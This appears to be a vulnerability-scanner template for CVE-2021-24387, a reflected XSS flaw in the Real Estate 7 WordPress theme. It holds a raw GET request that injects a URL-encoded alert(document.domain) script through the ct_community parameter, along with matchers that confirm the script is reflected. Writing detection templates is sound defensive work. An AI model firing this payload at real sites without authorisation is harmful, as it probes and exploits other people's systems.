id: CVE-2021-24387
info:
  author: suman_kar
  description: XSS in wordpress via ct_community parameter
  name: Real Estate 7 WordPress Theme < 3.1.1 - Unauthenticated Reflected XSS
  reference: https://cxsecurity.com/issue/WLB-2021070041
  severity: medium
  tags: cve,cve2021,xss,wordpress
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain);</script>
    - /wp-content/themes/realestate
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

    Connection: close

    '
